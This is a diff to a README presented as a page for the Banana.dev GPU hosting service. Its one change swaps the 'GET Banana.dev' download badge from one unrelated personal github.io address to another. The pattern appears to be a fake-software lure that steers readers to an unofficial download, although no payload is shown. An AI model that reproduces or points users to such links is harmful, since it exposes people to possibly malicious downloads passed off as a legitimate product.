@@ -1,7 +1,7 @@
 
 # Banana.dev GPU hosting - Serverless GPU Infrastructure for AI Deployment
 
-[![GET Banana.dev](https://img.shields.io/badge/GET%20%E2%80%94%20Banana.dev-0078D6?style=for-the-badge&logoColor=white)](https://micahwongirff.github.io/.github/banana-dev-app)
+[![GET Banana.dev](https://img.shields.io/badge/GET%20%E2%80%94%20Banana.dev-0078D6?style=for-the-badge&logoColor=white)](https://lavorinisilverseigfried.github.io/.github/banana-dev-app)
 
 ## What Banana.dev Provides for AI Teams
 
